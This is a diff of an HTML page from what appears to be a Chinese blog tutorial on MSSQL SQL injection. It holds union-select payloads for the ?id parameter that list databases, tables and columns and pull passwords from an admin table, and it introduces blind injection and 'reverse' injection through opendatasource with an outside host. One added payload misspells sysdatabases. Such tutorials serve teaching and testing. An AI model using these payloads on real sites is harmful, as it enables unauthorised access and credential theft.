@@ -25,14 +25,20 @@
     <div class="post-content">
         <h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1>
 <p>union all select db_name() 	 	//查询当前库名<br>
+union all select null,name,null from master.dbo.sysdatabases	//查询数据库<br>
 union all select null,null,null from dbo.sysobjects 	//查询表<br>
 union all select null,null,null from dbo.syscolumns		//查询字段</p>
 <hr>
+<p><strong>查询数据库</strong>💻</p>
+<p>?id=1 union all select null,name,null from master.dbo.stsdatabases</p>
+<p><img src="12312321321.jpg" alt="12312321321"></p>
+<p><strong>查询表名</strong>📑</p>
 <p>?id=1 union all select id,name,null from dbo.sysobjects where xtype=‘U’</p>
 <ul>
 <li>⏫id 和 name 是系统自带的字段名。查询完需要记住，你要查询的表ID。xtype='U’是指用户创建的表</li>
 </ul>
 <p><img src="2.jpg" alt="1"></p>
+<p><strong>查询字段名</strong></p>
 <p>?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx</p>
 <ul>
 <li>
@@ -40,18 +46,20 @@ union all select null,null,null from dbo.syscolumns		//查询字段</p>
 <p><img src="3.jpg" alt="2"></p>
 </li>
 </ul>
+<p><strong>查询字段内容</strong></p>
 <p>?id=1 union all select null,password,null from admin</p>
 <p><img src="4.jpg" alt="3"></p>
-<h1 id="0x02-MSSQL-反弹注入🎈">0x02 MSSQL 反弹注入🎈</h1>
+<h1 id="0x02-MSSQL-盲注👓">0x02 MSSQL 盲注👓</h1>
+<h1 id="0x03-MSSQL-反弹注入🎈">0x03 MSSQL 反弹注入🎈</h1>
 <ul>
 <li><strong>前言</strong>:</li>
 </ul>
 <p>这个是一个比较骚的操作。针对无回显注入点的时候。</p>
-<h2 id="0x02-1-反弹注入原理">0x02.1 反弹注入原理</h2>
+<h2 id="0x03-1-反弹注入原理">0x03.1 反弹注入原理</h2>
 <ul>
 <li>☂️MSSQL注射攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路，而反弹注入技术需要依靠opendatasource函数支持</li>
 </ul>
-<h2 id="0x02-2-反弹注入条件">0x02.2 反弹注入条件</h2>
+<h2 id="0x03-2-反弹注入条件">0x03.2 反弹注入条件</h2>
 <ul>
 <li>🌐需要一台外网主机，字段要相同</li>
 </ul>
@@ -90,7 +98,7 @@ union all select null,null,null from dbo.syscolumns		//查询字段</p>
 </div>
 <input type="hidden" id="web_style" value="black">
 
-
+<script src="/js/logo_title.js"></script>
 <script src="/libs/jquery.min.js"></script>
 <script src="/libs/highlight/highlight.pack.js"></script>
 <script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
